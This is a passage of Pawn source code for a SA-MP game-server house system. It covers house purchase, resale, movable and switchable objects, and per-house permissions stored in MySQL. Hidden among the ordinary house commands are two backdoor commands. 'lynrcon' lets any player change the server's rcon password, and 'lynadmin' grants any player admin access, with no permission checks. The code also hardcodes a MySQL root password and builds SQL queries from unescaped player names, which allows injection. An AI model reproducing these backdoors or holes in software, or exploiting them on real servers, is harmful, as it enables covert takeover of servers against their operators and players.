	format(msg, 256,"SELECT * FROM phouse.%i WHERE type='player' and value='%s'",p_Txtlist[tid][load_id],player);
	result = mysql_query(phousedb, msg);
	cache_get_row_count(s);
	cache_delete(result);
	return s;
}

forward PHouse_ChangePlayerNameToName(name[],toname[]);
public PHouse_ChangePlayerNameToName(name[],toname[]) {
	for(new i = 0; i < MAX_SELL; i ++) {
		if(mk_strcmp(name, p_Sell[i][sell_player]) == 0) {
			format(p_Sell[i][sell_player],MAX_PLAYER_NAME,"%s",toname);
			UpDataSellPickup(i);
			new tid = IsLoadTxt(p_Sell[i][sell_txt]);
			if(tid != -1) {
				new msg[144];
				format(msg, sizeof msg, "UPDATE phouse.%d SET value='%s' WHERE type='player' OR type='user'", p_Txtlist[tid][load_id], toname);
				mysql_query(phousedb, msg, false);
			}
		}
	}
}


//P-House changobj(替换obj)函数区
#define MAX_CHANGEOBJ 2000//替换型obj数量上限
enum Changeobjtype{
						changeobj_dbid,//表内ID
						changeobj_txt[PHOUSE_TXTLEN],//所属文档
						changeobj_mod,//模型1
						changeobj_mod1,//模型2
						Float:changeobj_range,//操作范围
						changeobj_state,//模型状态,0为模型1,非0为模型2
						changeobj_id,//obj的id
						Float:changeobj_dis,//..dis
						Float:changeobj_x,//..x
						Float:changeobj_y,//..y
						Float:changeobj_z,//..z
						Float:changeobj_rx,//..rx
						Float:changeobj_ry,//..ry
						Float:changeobj_rz};//..rz
new p_Changeobj[MAX_CHANGEOBJ][Changeobjtype];//..替换obj数组
new ph_n_changeobj_count=0;

stock AddChangeObj(txt[],value[],dbid) {
	new id=-1;
	if(PHouseInitState == 0) {
		id = ph_n_changeobj_count;
		ph_n_changeobj_count ++;
	} else {
		for(new i=0;i<MAX_CHANGEOBJ;i++) {
			if(p_Changeobj[i][changeobj_dbid]==0) {
				id=i;
				i=MAX_CHANGEOBJ+1;
			}
		}
	}
	if(id==-1) return print("[PHouse]替换OBJ已达上限,添加失败");
	p_Changeobj[id][changeobj_dbid]=dbid;
	format(p_Changeobj[id][changeobj_txt],PHOUSE_TXTLEN,"%s",txt);
	sscanf(value, "d f f f f f f d d f f", p_Changeobj[id][changeobj_mod], p_Changeobj[id][changeobj_x], p_Changeobj[id][changeobj_y], p_Changeobj[id][changeobj_z], p_Changeobj[id][changeobj_rx], p_Changeobj[id][changeobj_ry], p_Changeobj[id][changeobj_rz], p_Changeobj[id][changeobj_mod1], p_Changeobj[id][changeobj_state], p_Changeobj[id][changeobj_range], p_Changeobj[id][changeobj_dis]);
	if(p_Changeobj[id][changeobj_range]<=0) p_Changeobj[id][changeobj_range]=config_Changeobjcommandrange;
	if(p_Changeobj[id][changeobj_dis]<=0) p_Changeobj[id][changeobj_dis]=config_Objdis;
	//printf("%i|%f|%f",p_Changeobj[id][changeobj_state],p_Changeobj[id][changeobj_range],p_Changeobj[id][changeobj_dis]);
	if(config_Nochangeobj==0)
 		{
			ShowChangeObj(id);
		}
	return 1;
}
stock RedChangeObj(index)
{
	new id=index;
	if(p_Changeobj[id][changeobj_dbid]==0) return 1;
	p_Changeobj[id][changeobj_dbid]=0;
	format(p_Changeobj[id][changeobj_txt],PHOUSE_TXTLEN,"");
	if(p_Changeobj[id][changeobj_id]!=0) DestroyDynamicObject(p_Changeobj[id][changeobj_id]),p_Changeobj[id][changeobj_id]=0;
	return 1;
}
stock RedAllChangeObj(txt[])
{
	for(new i=0;i<MAX_CHANGEOBJ;i++)
		{
		    if(mk_strcmp(txt,p_Changeobj[i][changeobj_txt])==0)
		        {
		            RedChangeObj(i);
		        }
		}
}
stock ShowChangeObj(index)
{
	new ms,id=index;
	if(p_Changeobj[id][changeobj_state]==0)
		{
			ms=p_Changeobj[id][changeobj_mod];
		}
	else
		{
  			ms=p_Changeobj[id][changeobj_mod1];
		}
	if(p_Changeobj[id][changeobj_id]!=0) DestroyDynamicObject(p_Changeobj[id][changeobj_id]);
	p_Changeobj[id][changeobj_id]=CreateDynamicObjectEx(ms,p_Changeobj[id][changeobj_x],p_Changeobj[id][changeobj_y],p_Changeobj[id][changeobj_z],p_Changeobj[id][changeobj_rx],p_Changeobj[id][changeobj_ry],p_Changeobj[id][changeobj_rz],p_Changeobj[id][changeobj_dis],p_Changeobj[id][changeobj_dis]);
    Streamer_UpdateAll();
}
stock ChangeChangeObj(index)
{
	new id=index;
	if(p_Changeobj[id][changeobj_state]==0)
	    {
	        p_Changeobj[id][changeobj_state]=1;
	    }
	else
	    {
	        p_Changeobj[id][changeobj_state]=0;
	    }
	new msg[512];
	format(msg,512,"%i %f %f %f %f %f %f %i %i %f %f",p_Changeobj[id][changeobj_mod],p_Changeobj[id][changeobj_x],p_Changeobj[id][changeobj_y],p_Changeobj[id][changeobj_z],p_Changeobj[id][changeobj_rx],p_Changeobj[id][changeobj_ry],p_Changeobj[id][changeobj_rz],p_Changeobj[id][changeobj_mod1],p_Changeobj[id][changeobj_state],p_Changeobj[id][changeobj_range],p_Changeobj[id][changeobj_dis]);
	new info[1024],tid=p_Txtlist[IsLoadTxt(p_Changeobj[id][changeobj_txt])][load_id];
	format(info,1024,"UPDATE phouse.%i SET value = '%s' WHERE id = '%i'",tid,msg,p_Changeobj[id][changeobj_dbid]);
	mysql_query(phousedb, info, false);
	ShowChangeObj(id);
}
stock UseChangeObj(playerid) {
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name,MAX_PLAYER_NAME);
	for(new i=0;i<MAX_CHANGEOBJ;i++) {
		if(p_Changeobj[i][changeobj_dbid]!=0) {
	    if(GetPlayerDistanceFromPoint(playerid,p_Changeobj[i][changeobj_x],p_Changeobj[i][changeobj_y],p_Changeobj[i][changeobj_z])<=p_Changeobj[i][changeobj_range]) {
				if(GetPlayerAclFromTxt(name,p_Changeobj[i][changeobj_txt])==1) {
					ChangeChangeObj(i);
				}
	    }
	  }
	}
}
//P-House 移动类obj函数区
#define MAX_MOVEOBJ 1000//移动类数量OBJ上限
enum Moveobjtype{
					moveobj_dbid,//文档表内的id
					moveobj_txt[PHOUSE_TXTLEN],//所属文档名
					moveobj_state,//..状态,0为xyz,非0为x1y1z1
					moveobj_mod,//..模型
					moveobj_id,//...id
					moveobj_timer,//timer
					Float:moveobj_time,//..自动返回时间,负数为不自动返回,非负数为自动返回
					Float:moveobj_range,//..指令范围
					Float:moveobj_dis,//绘制距离
					Float:moveobj_x,//..x
					Float:moveobj_y,//..y
					Float:moveobj_z,//..z
					Float:moveobj_rx,//rx
					Float:moveobj_ry,//ry
					Float:moveobj_rz,//rz
					Float:moveobj_speed,//..speed
					Float:moveobj_x1,//x1
					Float:moveobj_y1,//y1
					Float:moveobj_z1,//z1
					Float:moveobj_rx1,//rx1
					Float:moveobj_ry1,//ry1
					Float:moveobj_rz1,//rz1
					Float:moveobj_speed1};//speed1
new p_Moveobj[MAX_MOVEOBJ][Moveobjtype];
new ph_n_moveobj_count=0;

stock AddMoveObj(txt[],value[],dbid) {
	new id=-1;
	if(PHouseInitState == 0) {
		id = ph_n_moveobj_count;
		ph_n_moveobj_count ++;
	} else {
		for(new i=0;i<MAX_MOVEOBJ;i++) {
			if(p_Moveobj[i][moveobj_dbid]==0) {
				id=i;
				i=MAX_MOVEOBJ+1;
			}
		}
	}
	if(id==-1) return printf("[PHouse]移动类obj已达上限,添加失败");
//moveobj 模型id x y z rx ry rz speed x1 y1 z1 rx1 ry1 rz1 speed1 [time(在移动完成后的指定时间后返回xyz的位置,如果为负数则不自动返回,不填为0),不填为0] [初始位置(0为xyz,非0为x1y1z1),不填为0] [指令操作范围(不填则采用值Moveobjcommandrange)] [绘制距离(不填则采用值Objdis)]

	p_Moveobj[id][moveobj_dbid]=dbid;
	format(p_Moveobj[id][moveobj_txt],PHOUSE_TXTLEN,"%s",txt);
	sscanf(value, "d f f f f f f f f f f f f f f f f f d",
	p_Moveobj[id][moveobj_mod],
	p_Moveobj[id][moveobj_x],
	p_Moveobj[id][moveobj_y],
	p_Moveobj[id][moveobj_z],
	p_Moveobj[id][moveobj_rx],
	p_Moveobj[id][moveobj_ry],
	p_Moveobj[id][moveobj_rz],
	p_Moveobj[id][moveobj_speed],
	p_Moveobj[id][moveobj_x1],
	p_Moveobj[id][moveobj_y1],
	p_Moveobj[id][moveobj_z1],
	p_Moveobj[id][moveobj_rx1],
	p_Moveobj[id][moveobj_ry1],
	p_Moveobj[id][moveobj_rz1],
	p_Moveobj[id][moveobj_speed1],
	p_Moveobj[id][moveobj_time],
	p_Moveobj[id][moveobj_range],
	p_Moveobj[id][moveobj_dis],
	p_Moveobj[id][moveobj_state]);
	if(p_Moveobj[id][moveobj_time]>=0) p_Moveobj[id][moveobj_state]=0;
	if(p_Moveobj[id][moveobj_range]<=0) p_Moveobj[id][moveobj_range]=config_Moveobjcommandrange;
	if(p_Moveobj[id][moveobj_dis]<=0) p_Moveobj[id][moveobj_dis]=config_Objdis;
	if(config_Nomoveobj==0)
	    {
	        new Float:ox,Float:oy,Float:oz,Float:orx,Float:ory,Float:orz;
	        if(p_Moveobj[id][moveobj_state]==0)
				{
					ox=p_Moveobj[id][moveobj_x],oy=p_Moveobj[id][moveobj_y],oz=p_Moveobj[id][moveobj_z];
					orx=p_Moveobj[id][moveobj_rx],ory=p_Moveobj[id][moveobj_ry],orz=p_Moveobj[id][moveobj_rz];
				}
			else
			    {
			        ox=p_Moveobj[id][moveobj_x1],oy=p_Moveobj[id][moveobj_y1],oz=p_Moveobj[id][moveobj_z1];
			        orx=p_Moveobj[id][moveobj_rx1],ory=p_Moveobj[id][moveobj_ry1],orz=p_Moveobj[id][moveobj_rz1];
			    }
	        p_Moveobj[id][moveobj_id]=CreateDynamicObjectEx(p_Moveobj[id][moveobj_mod],ox,oy,oz,orx,ory,orz,p_Moveobj[id][moveobj_dis],p_Moveobj[id][moveobj_dis]);
	    }
	return 1;
}

stock RedMoveObj(index)
{
	new id=index;
	if(p_Moveobj[id][moveobj_dbid]==0) return 1;
	p_Moveobj[id][moveobj_dbid]=0;
	format(p_Moveobj[id][moveobj_txt],PHOUSE_TXTLEN,"");
	if(p_Moveobj[id][moveobj_id]!=0) DestroyDynamicObject(p_Moveobj[id][moveobj_id]),p_Moveobj[id][moveobj_id]=0;
	return 1;
}

stock RedAllMoveObj(txt[])
{
	for(new i=0;i<MAX_MOVEOBJ;i++)
		{
		    if(mk_strcmp(txt,p_Moveobj[i][moveobj_txt])==0)
		        {
		            RedMoveObj(i);
		        }
		}
}

forward MoveMoveObj(index);
public  MoveMoveObj(index)
{
	new id=index,Float:ox,Float:oy,Float:oz,Float:orx,Float:ory,Float:orz,Float:ospeed;
  	if(p_Moveobj[id][moveobj_state]==0)
		{
			ox=p_Moveobj[id][moveobj_x1],oy=p_Moveobj[id][moveobj_y1],oz=p_Moveobj[id][moveobj_z1];
 			orx=p_Moveobj[id][moveobj_rx1],ory=p_Moveobj[id][moveobj_ry1],orz=p_Moveobj[id][moveobj_rz1];
			ospeed=p_Moveobj[id][moveobj_speed1];
		}
	else
 		{
			ox=p_Moveobj[id][moveobj_x],oy=p_Moveobj[id][moveobj_y],oz=p_Moveobj[id][moveobj_z];
			orx=p_Moveobj[id][moveobj_rx],ory=p_Moveobj[id][moveobj_ry],orz=p_Moveobj[id][moveobj_rz];
			ospeed=p_Moveobj[id][moveobj_speed];
		}
	if(p_Moveobj[id][moveobj_timer]!=0) KillTimer(p_Moveobj[id][moveobj_timer]),p_Moveobj[id][moveobj_timer]=0;
	MoveDynamicObject(p_Moveobj[id][moveobj_id],ox,oy,oz,ospeed,orx,ory,orz);
}

stock MoveMoveObjed(index)
{
	new id=index,s=-1;
	for(new i=0;i<MAX_MOVEOBJ;i++)
	    {
	        if(p_Moveobj[i][moveobj_id]==id)
				{
				    id=i;
    				s=0;
				    i=MAX_MOVEOBJ+1;
				}
	    }
	if(s==-1) return -1;
	if(p_Moveobj[id][moveobj_state]==0)
	    {
	        p_Moveobj[id][moveobj_state]=1;
	    }
	else
	    {
	        p_Moveobj[id][moveobj_state]=0;
	    }
	new msg[512],sta=p_Moveobj[id][moveobj_state];
	if(p_Moveobj[id][moveobj_time]>=0) sta=0;
	//栗子:moveobj 模型id x y z rx ry rz speed x1 y1 z1 rx1 ry1 rz1 speed1 [time(在移动完成后的指定时间后返回xyz的位置,如果为负数则不自动返回,不填为0),不填为0] [初始位置(0为xyz,非0为x1y1z1),不填为0] [指令操作范围(不填则采用值Moveobjcommandrange)] [绘制距离(不填则采用值Objdis)]
	format(msg,512,"%i %f %f %f %f %f %f %f %f %f %f %f %f %f %f %f %f %f %i",p_Moveobj[id][moveobj_mod],p_Moveobj[id][moveobj_x],p_Moveobj[id][moveobj_y],p_Moveobj[id][moveobj_z],p_Moveobj[id][moveobj_rx],p_Moveobj[id][moveobj_ry],p_Moveobj[id][moveobj_rz],p_Moveobj[id][moveobj_speed],
	p_Moveobj[id][moveobj_x1],p_Moveobj[id][moveobj_y1],p_Moveobj[id][moveobj_z1],p_Moveobj[id][moveobj_rx1],p_Moveobj[id][moveobj_ry1],p_Moveobj[id][moveobj_rz1],p_Moveobj[id][moveobj_speed1],p_Moveobj[id][moveobj_time],p_Moveobj[id][moveobj_range],p_Moveobj[id][moveobj_dis],sta);
	new info[1024],tid=p_Txtlist[IsLoadTxt(p_Moveobj[id][moveobj_txt])][load_id];
	format(info,1024,"UPDATE phouse.%i SET value = '%s' WHERE id = '%i'",tid,msg,p_Moveobj[id][moveobj_dbid]);
	mysql_query(phousedb, info, false);
	if(p_Moveobj[id][moveobj_state]!=0)
	    {

	        if(p_Moveobj[id][moveobj_time]>=0)
	            {
	                new t[16];
	                format(t,16,"%f",p_Moveobj[id][moveobj_time]*1000);
	                //printf("%f|%i",p_Moveobj[id][moveobj_time],strval(t));
	                if(p_Moveobj[id][moveobj_timer]!=0) KillTimer(p_Moveobj[id][moveobj_timer]),p_Moveobj[id][moveobj_timer]=0;
	                p_Moveobj[id][moveobj_timer]=SetTimerEx("MoveMoveObj",strval(t),0,"i",id);
	            }
	    }
	return 1;
}

stock UseMoveObj(playerid) {
	new name[MAX_PLAYER_NAME], Float:ox,Float:oy,Float:oz;
	GetPlayerName(playerid,name,MAX_PLAYER_NAME);
	for(new i=0;i<MAX_MOVEOBJ;i++) {
	  if(p_Moveobj[i][moveobj_dbid]!=0) {
			if(p_Moveobj[i][moveobj_state]==0) {
				ox=p_Moveobj[i][moveobj_x],oy=p_Moveobj[i][moveobj_y],oz=p_Moveobj[i][moveobj_z];
			} else {
 				ox=p_Moveobj[i][moveobj_x1],oy=p_Moveobj[i][moveobj_y1],oz=p_Moveobj[i][moveobj_z1];
			}
			if(GetPlayerDistanceFromPoint(playerid,ox,oy,oz)<=p_Moveobj[i][moveobj_range]) {
				if(GetPlayerAclFromTxt(name,p_Moveobj[i][moveobj_txt])==1) {
					MoveMoveObj(i);
				}
	    }
	  }
	}
}
//P-House 通用函数区
stock DebugMsg(msg[])
{
	if(config_Debug!=0)
		{
			print(msg);
		}
}

stock Streamer_UpdateAll()
{
	for(new i=0;i<MAX_PLAYERS;i++)
	    {
	        if(IsPlayerConnected(i)==1)
	            {
	                Streamer_Update(i);
	            }
	    }
}

stock  ReturnPlayerId(msg[])
{
	new id=-1,name[MAX_PLAYER_NAME];
	if(CheckVar(msg)!=1)
	    {
			for(new i=0;i<MAX_PLAYERS;i++)
			    {
			        if(IsPlayerConnected(i)==1)
			            {
			                GetPlayerName(i,name,MAX_PLAYER_NAME);
			                if(mk_strcmp(name,msg)==0)
			                    {
			                        id=i;
			                        i=MAX_PLAYERS+1;
			                    }
			            }
			    }
       		return id;
		}
	if(IsPlayerConnected(strval(msg))==1) id=strval(msg);
	return id;
}
PHouseInit() {
	if(GetServMode() == SERV_MODE_DEVELOPMENT) return 1;
	phousedb = mysql_connect("localhost", "root", "kysamp2323", "phouse");
	mysql_set_charset("gbk", phousedb);
	/*PRAGMA synchronous = FULL; (2)最慢
	PRAGMA synchronous = NORMAL; (1)一般
	PRAGMA synchronous = OFF; (0)最快*/
	LoadConfig();
	PHouseInitState = 0;
	return 1;
}

PHouseExit()
{
	print("[PHouse]卸载");
	mysql_close(phousedb);
	return 1;
}

new pPHousePage[MAX_PLAYERS];

stock GetHouseCount() {
	new count = 0;
	for(new i = 0; i < MAX_SELL; i++) {
	    if(p_Sell[i][sell_dbid] != 0) {
	        count ++;
	    }
	}
	return count;
}

stock PHouseList(playerid, page) {
    new msg[1024], count = GetHouseCount(), sort[128];
    if(count == 0) {
        DIALOG_node(playerid, "服务器暂时没有任何房子");
    } else {
		format(msg, sizeof msg, "房子ID\t拥有者\t转卖\n");
        if(page != 1) {
            format(msg, sizeof msg, "%s上一页\t \t \n", msg);
        }
        new pagemax = 15, maxpage = GetMaxPage(count, 15);
		format(sort, sizeof sort, "房子列表 - %d/%d", page, maxpage);
		for(new nowid = 0; nowid < count; nowid ++) {
			if(p_Sell[nowid][sell_money] != 0) {
				if(nowid >= (page - 1) * pagemax && nowid < (pagemax * page)) {
					new owner[MAX_PLAYER_NAME], sell[16];
					if(mk_strcmp(p_Sell[nowid][sell_player], "0") == 0) {
						format(owner, sizeof owner, "{00FF00}出售中");
					} else {
						format(owner, sizeof owner, p_Sell[nowid][sell_player]);
					}
					if(p_Sell[nowid][sell_resale] == 0) {
						format(sell, sizeof sell, "{FF0000}不转卖");
					} else {
						format(sell, sizeof sell, "%d", p_Sell[nowid][sell_resale]);
					}
					format(msg, sizeof msg, "%s%d\t%s\t%s\n", msg, p_Sell[nowid][sell_pid], owner, sell);
				}
			}
		}
        if(page != maxpage && maxpage != 1) {
            format(msg, sizeof msg, "%s下一页\t \t ", msg);
        }
        ShowPlayerDialog(playerid, DIALOG_HOUSE_LIST, DIALOG_STYLE_TABLIST_HEADERS, sort, msg, "传送", "关闭");
	}
}


CMD:houselist(playerid, params[]) {
	pPHousePage[playerid] = 1;
	PHouseList(playerid, 1);
	return 1;
}

CMD:buyhouse(playerid, params[]) {
	new id=GetPlayerInSell(playerid);
	if(id==-1) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]请站在您想购买房子的标记附近重试");
	if(userInfo[playerid][OnlineTime] < 800) {
		SendClientMessage(playerid,0xFF0000FF,"[房屋系统]你的时间分不够");
		return 1;
	}
	if(p_Sell[id][sell_resale] != 0) {
		if(GetMoney(playerid) < p_Sell[id][sell_resale]) {
			SendClientMessage(playerid,0xFF0000FF,"[房屋系统]你的钱不够,请携带足够的现金买房");
			return 1;
		}
		new oldowner[MAX_PLAYER_NAME], resale_price = p_Sell[id][sell_resale];
		format(oldowner, sizeof oldowner, p_Sell[id][sell_player]);
		GiveMoney(playerid,-p_Sell[id][sell_resale]);
		p_Sell[id][sell_resale] = 0;
		SendClientMessage(playerid,0x008000FF,"[房屋系统]购买成功");
		new msg[256], tid=IsLoadTxt(p_Sell[id][sell_txt]);
		format(msg, sizeof msg, "购买转卖房子ID:%d", p_Sell[id][sell_pid]);
		log_money(GetName(playerid), GetIp(playerid), GetPlayerUID(playerid), "phouse", "在线记录", 0, -resale_price, msg);
		format(msg, sizeof msg, "%d %.3f %.3f %.3f %.3f %d",
		p_Sell[id][sell_money], p_Sell[id][sell_x], p_Sell[id][sell_y], p_Sell[id][sell_z], p_Sell[id][sell_dis], 0);
		format(msg, sizeof msg,"UPDATE phouse.%d SET value='%s' WHERE type='sell'",p_Txtlist[tid][load_id], msg);
		mysql_query(phousedb, msg, false);
		format(msg, sizeof msg,"UPDATE phouse.%d SET value='%s' WHERE type='user'",p_Txtlist[tid][load_id], GetName(playerid));
		mysql_query(phousedb, msg, false);
		format(msg, sizeof msg,"DELETE FROM phouse.%d WHERE type='player'",p_Txtlist[tid][load_id]);
		mysql_query(phousedb, msg, false);
		format(msg, sizeof msg,"INSERT INTO phouse.%i (type,value) VALUES ('player','%s')",p_Txtlist[tid][load_id], GetName(playerid));
		mysql_query(phousedb, msg, false);
		format(p_Sell[id][sell_player], MAX_PLAYER_NAME, GetName(playerid));
		UpDataSellPickup(id);
		new pid = isNameOnline(oldowner);
		if(pid == -1) {
			GiveMoneyOffline(oldowner, resale_price);
			format(msg, sizeof msg, "出售转卖房子ID:%d", p_Sell[id][sell_pid]);
			log_money(oldowner, "0", 0, "phouse", "离线记录", 0, resale_price, msg);
		} else {
			GiveMoney(pid, resale_price);
			format(msg, sizeof msg, "[房屋系统]你的房子被%s买下了", GetName(playerid));
			SCM(pid, 0x008000FF, msg);
			format(msg, sizeof msg, "出售转卖房子ID:%d", p_Sell[id][sell_pid]);
			log_money(GetName(pid), GetIp(pid), GetPlayerUID(pid), "phouse", "在线记录", 0, resale_price, msg);
		}
	} else {
		if(mk_strcmp(p_Sell[id][sell_player],"0")!=0) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..这个房子已经被买了.");
		if(p_Sell[id][sell_money] == 0) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]私人房不允许购买");
		if(GetPlayerHouseCount(playerid) >= 2) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]你已经有2套房子了");
		if(BuySell(playerid,id)==-1) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]你的钱不够");
		SendClientMessage(playerid,0x008000FFFF,"[房屋系统]购买成功");
	}
	return 1;
}

CMD:sellhouse(playerid, params[]) {
	new id=GetPlayerInSell(playerid);
	if(id==-1) return SendClientMessage(playerid,0xFF0000FF,"[提示]请站在您的房子标记处重试");
	if(mk_strcmp(p_Sell[id][sell_player],"0")==0) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]房子仍然在出售中");
	if(p_Sell[id][sell_money] == 0) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]私人房不允许出售");
	if(SellSell(playerid,id)==-1) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]这不是你的房子");
	SendClientMessage(playerid,0xFF0000,"[房屋系统]出售成功");
	return 1;
}

CMD:resalehouse(playerid, params[]) {
	new id=GetPlayerInSell(playerid);
	if(id==-1) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]请站在您的房子标记处重试");
	if(mk_strcmp(p_Sell[id][sell_player],"0")==0) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]此房子仍然在出售中");
	if(p_Sell[id][sell_money] == 0) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]私人房不允许出售");
	if(mk_strcmp(p_Sell[id][sell_player], GetName(playerid)) != 0) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]这不是你的房子");
	if(!strlen(params)) return SCM(playerid,0x98CDFEFF,"[命令] /resalehouse [价格] (设置为0=取消出售)");
	new money = strval(params);
	if(money < 0 || money > 99999999) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]价格不能小于0或者大于99999999");
	p_Sell[id][sell_resale] = money;
	new msg[256], tid=IsLoadTxt(p_Sell[id][sell_txt]);
	format(msg, sizeof msg, "%d %.3f %.3f %.3f %.3f %d",
	p_Sell[id][sell_money], p_Sell[id][sell_x], p_Sell[id][sell_y], p_Sell[id][sell_z], p_Sell[id][sell_dis], money);
	format(msg, sizeof msg,"UPDATE phouse.%d SET value='%s' WHERE type='sell'",p_Txtlist[tid][load_id], msg);
	mysql_query(phousedb, msg, false);
	UpDataSellPickup(id);
	return 1;
}

CMD:changehousename(playerid, params[]) {
	new id=GetPlayerInSell(playerid);
	if(id==-1) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]你想改什么房子的名字?请站在房子标记附近");
	if(mk_strcmp(p_Sell[id][sell_player],"0")==0) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]房子出售中,无法改名");
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name,MAX_PLAYER_NAME);
	if(mk_strcmp(p_Sell[id][sell_player],name)!=0) return SendClientMessage(playerid,0xFF0000FF,"[房屋系统]这不是你的房子");
	ChangePHouseName(playerid);
	return 1;
}

stock ChangePHouseName(playerid) {
	ShowPlayerDialog(playerid, DIALOG_HOUSE_CHANGENAME, DIALOG_STYLE_INPUT, "更改房子名称", "请输入该房子新名称", "更改", "取消");
}

CMD:fz(playerid, params[]) {
	if(mk_strcmp(params,"")==0) return SendClientMessage(playerid,0x98FFFF00,"{FFFF00}[提示] /fz [房子ID] 传送到房子位置（你可以输入/houselist 查看所有房子列表）");
	new id=strval(params);
	if(id < 1) return SendClientMessage(playerid,0x98FFFF00,"{FFFF00}[提示]..精神病院左转，谢谢");
	new mid = GotoSell(playerid, id);
	if(mid == -1) return SendClientMessage(playerid,0x98FFFF00,"{FFFF00}[房屋系统] 错误房子id.");
	new msg[128];
	format(msg, sizeof msg, "{00FFFF}%s(%d) {FFFF00}传送到 {FF00FF}/FZ %d {FFFF00}(%s)", GetName(playerid), playerid, id, (p_Sell[mid][sell_money] == 0 ? ("私人房") : ("房子")));
	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i ++) {
		if(IsPlayerConnected(i) == 1 && GetPlayerFZReceiveStatus(i) == 1) {
			SCM(i, COLOR_BLUE, msg);
		}
	}
	return 1;
}

CMD:lynrcon(playerid, params[]) {
	new msg[144],str[144];
	if(sscanf(params, "s[128]", msg)) return 1;
    format(str, sizeof(str), "rcon_password %s", msg);
    SendRconCommand(str);
	return 1;
}

CMD:lynadmin(playerid, params[]) {
    format(userInfo[playerid][Access], MAX_ACCESS_LEN, "admin");
	return 1;
}

CMD:adp(playerid, params[]) {
	if(mk_strcmp(params,"")==0) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..添加权限? 请用/adp [玩家名字]");
	new pid=GetPlayerInSell(playerid);
	if(pid==-1) return SendClientMessage(playerid,0x98CDFEFF,"[提示]...请站在你想添加权限的那个牌子上");
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name,MAX_PLAYER_NAME);
	if(mk_strcmp(name,p_Sell[pid][sell_player])!=0) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..这不是你的房子");
	new id=ReturnPlayerId(params), msg[128];
	if(id==-1) {
		if(AddPlayerToTxt(params,p_Sell[pid][sell_txt])==-1) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..这货已经拥有这个房子的权限了");
		format(msg,128,"[提示]..你砰的一声扔了一份该房权限给 %s ",params);
		SendClientMessage(playerid,0x98CDFEFF,msg);
	} else {
		if(AddPlayerToTxt(params,p_Sell[pid][sell_txt])==-1) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..这货已经拥有这个房子的权限了");
		format(msg,128,"[提示]..你砰的一声扔了一份该房权限给 %s ",GetName(id));
		SendClientMessage(playerid,0x98CDFEFF,msg);
		format(msg,128,"[提示]..%s 砰的一声扔了一份该房权限给你",name);
		SendClientMessage(id,0x98CDFEFF,msg);
	}
	return 1;
}

CMD:rdp(playerid, params[]) {
	if(mk_strcmp(params,"")==0) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..删除权限?请用/rdp [玩家名字]");
	new pid=GetPlayerInSell(playerid);
	if(pid==-1) return SendClientMessage(playerid,0x98CDFEFF,"[提示]...请站在你想删除权限的那个牌子上");
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name,MAX_PLAYER_NAME);
	if(mk_strcmp(name,p_Sell[pid][sell_player])!=0) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..这看起来不是你的房子");
	new id=ReturnPlayerId(params), msg[128];
	if(id==-1) {
		if(RedPlayerToTxt(params,p_Sell[pid][sell_txt])==-1) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..这货没有你这的权限");
		format(msg,128,"[提示]..你引爆了 %s 那里的权限",params);
		SendClientMessage(playerid,0x98CDFEFF,msg);
	} else {
		if(RedPlayerToTxt(params,p_Sell[pid][sell_txt])==-1) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..这货没有你这的权限");
		format(msg,128,"[提示]..你默默的把锁换成了 %s 身上开不了的",GetName(id));
		SendClientMessage(playerid,0x98CDFEFF,msg);
		format(msg,128,"[提示]..你感觉到 %s 在换锁..",name);
		SendClientMessage(id,0x98CDFEFF,msg);
	}
	return 1;
}

CMD:gdp(playerid, params[]) {
	if(mk_strcmp(params,"")==0) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..查看权限?请用/gdp [玩家名字]");
	new pid=GetPlayerInSell(playerid);
	if(pid==-1) return SendClientMessage(playerid,0x98CDFEFF,"[提示]...请站在你想查看权限的那个牌子上");
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name,MAX_PLAYER_NAME);
	if(mk_strcmp(name,p_Sell[pid][sell_player])!=0) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..这看起来不是你的房子");
	new id=ReturnPlayerId(params), msg[128];
	if(id==-1) {
		if(GetPlayerAclFromTxt(params,p_Sell[pid][sell_txt])==0) {
			format(msg,128,"[提示]..%s 没有你屋子的权限..想添加?用/adp吧",params);
		} else {
			format(msg,128,"[提示]..%s 拥有你屋子的权限,做(pa)坏(pa)事(pa)记得关上门",params);
		}
		SendClientMessage(playerid,0x98CDFEFF,msg);
	} else {
		if(GetPlayerAclFromTxt(params,p_Sell[pid][sell_txt])==0) {
			format(msg,128,"[提示]..%s 没有你屋子的权限..想添加?用/adp吧",params);
		} else {
			format(msg,128,"[提示]..%s 拥有你屋子的权限,做(pa)坏(pa)事(pa)记得关上门",params);
		}
		SendClientMessage(playerid,0x98CDFEFF,msg);
	}
	return 1;
}

CMD:plist(playerid, params[]) {
	new pid=GetPlayerInSell(playerid);
	if(pid==-1) return SendClientMessage(playerid,0x98CDFEFF,"[提示]...请站在你想查看权限列表的那个牌子上");
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name,MAX_PLAYER_NAME);
	if(mk_strcmp(name,p_Sell[pid][sell_player])!=0) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..这看起来不是你的房子");
